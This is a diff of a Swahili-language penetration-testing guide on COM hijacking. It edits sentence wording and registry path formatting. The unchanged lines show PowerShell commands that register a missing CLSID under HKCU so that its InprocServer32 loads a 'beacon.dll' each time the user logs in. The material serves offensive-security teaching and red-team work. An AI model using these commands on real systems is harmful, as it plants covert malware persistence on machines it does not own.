@@ -10,7 +10,7 @@ Kwa kuwa thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** i
 - ambapo _Result_ ni **NAME NOT FOUND**.
 - na _Path_ inamalizika na **InprocServer32**.
 
-Mara tu unapokuwa umekamua ni COM ipi isiyopo ya kuiga, tekeleza amri zifuatazo. _Kuwa makini ikiwa utaamua kuiga COM ambayo inaloadi kila sekunde chache kwani hiyo inaweza kuwa kupita kiasi._
+Mara tu unapokuwa umeamua ni COM ipi isiyopo unayotaka kuiga, tekeleza amri zifuatazo. _Kuwa makini ikiwa unataka kuiga COM inayopakuliwa kila sekunde chache kwani hiyo inaweza kuwa kupita kiasi._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
@@ -51,7 +51,7 @@ Write-Host
 
 Kuangalia matokeo unaweza kuchagua moja ambayo itatekelezwa **kila wakati mtumiaji anapoingia** kwa mfano.
 
-Sasa kutafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** na katika HKLM na HKCU, kwa kawaida utaona kwamba thamani hiyo haipo katika HKCU.
+Sasa kutafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na katika HKLM na HKCU, kwa kawaida utaona kwamba thamani hiyo haipo katika HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
